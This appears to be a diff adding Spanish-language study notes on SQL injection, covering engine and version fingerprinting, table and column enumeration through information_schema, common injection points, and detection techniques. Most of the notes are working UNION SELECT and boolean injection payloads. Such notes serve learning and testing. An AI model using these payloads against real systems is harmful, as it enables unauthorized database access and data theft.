@@ -1,0 +1,57 @@
+SQL Injection — Examinando la base de datos
+
+1. Motor y versión
+
+Saber el motor ayuda a elegir payloads correctos (funciones, concatenación, sleep, comentarios).
+
+Payloads típicos (inserta en un parámetro vulnerable como id):
+
+• MySQL version: 1' AND @@version LIKE '%5.%' --
+• Generic version extraction: ' UNION SELECT @@version--
+• PostgreSQL: ' UNION SELECT version()--
+• MSSQL: ' UNION SELECT @@version--
+
+Si la aplicación retorna la versión, ya sabes muchas funciones disponibles.
+
+2. tablas/columnas útiles
+
+En MySQL:
+
+SELECT table_name FROM information_schema.tables WHERE table_schema=database();
+SELECT column_name FROM information_schema.columns WHERE table_name='users';
+
+En PostgreSQL las tablas del catálogo son pg_catalog o information_schema.
+
+Payload de enumeración (ejemplo MySQL):
+
+' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--
+
+Para enumerar columnas de una tabla concreta:
+
+' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
+
+3. Detecting SQL injection vulnerabilities — en distintas partes y contextos
+
+Lugares comunes para inyectar:
+
+• Parámetros GET/POST (e.g. ?id=1)
+• Cabeceras HTTP (User-Agent, Referer)
+• Cookies
+• Campos de formularios (búsqueda, filtro, login, creación de cuenta)
+• Valores usados en cláusulas ORDER BY, LIMIT, FROM, JOIN, GROUP BY
+
+Técnicas de detección:
+
+• Inyectar comillas: 1' o " y observar errores o comportamiento.
+• Pruebas booleanas: 1' AND 1=1 -- vs 1' AND 1=2 --.
+• Probar comentarios: --, # (MySQL), /* ... */.
+• Probar UNION SELECT para forzar una unión que muestre resultados.
+
+Contextos especiales:
+
+• Dentro de una cadena literal: '... user input ...' → usar ' OR '1'='1 o cerrar la comilla.
+• Dentro de números: no usar comillas, por eso 1 OR 1=1.
+• Dentro de LIKE: usar ' OR 'a' LIKE 'a'.
+• En ORDER BY: usar ORDER BY 1,2,3 para detectar columnas.
+
+---
